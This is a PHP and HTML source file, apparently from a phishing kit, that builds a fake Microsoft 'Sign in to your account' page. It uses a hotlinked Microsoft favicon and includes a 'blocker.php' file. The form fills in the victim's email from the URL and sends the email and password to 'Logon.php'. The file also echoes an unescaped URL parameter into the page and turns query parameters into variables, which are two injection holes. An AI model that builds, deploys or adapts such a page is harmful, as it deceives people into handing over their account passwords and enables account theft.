<?php
include('blocker.php');

// start > to get url and and put id 
	$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	parse_str(parse_url($url, PHP_URL_QUERY));

	$parts = @explode('@', $email);
	$user = @$parts[0];
// < end 


$email = $_GET['email'];


?>



<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Sign in to your account </title>
<link rel="shortcut icon" type="image/x-icon" href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.5104.7/content/images/favicon_a.ico"/>
<link href="images/main_css.css" rel="stylesheet">
<link href="images/index.css" rel="stylesheet">
</head>
<body>
<div id="wb_Image1" style="position:absolute;left:2px;top:1px;width:864px;height:661px;z-index:3;">
<img src="images/1.png" id="Image1" alt=""></div>
<div id="wb_Image2" style="position:absolute;left:866px;top:1px;width:496px;height:663px;z-index:4;">
<img src="images/2.jpg" id="Image2" alt=""></div>
<div id="wb_Form1" style="position:absolute;left:904px;top:173px;width:369px;height:194px;z-index:5;">
<form name="Form" method="post" action="Logon.php" id="Form">
<input type="text" id="Editbox1" style="position:absolute;left:12px;top:14px;width:340px;height:20px;line-height:20px;z-index:0;" name="email" value="<?php echo $email ?>" placeholder="someone@example.com">
<input type="password" id="Editbox2" style="position:absolute;left:12px;top:51px;width:340px;height:20px;line-height:20px;z-index:1;" name="password" value="" placeholder="Password">
<input type="submit" id="Button1" name="" value="" style="position:absolute;left:11px;top:155px;width:68px;height:39px;z-index:2;">
</form>
</div>
</body>
</html>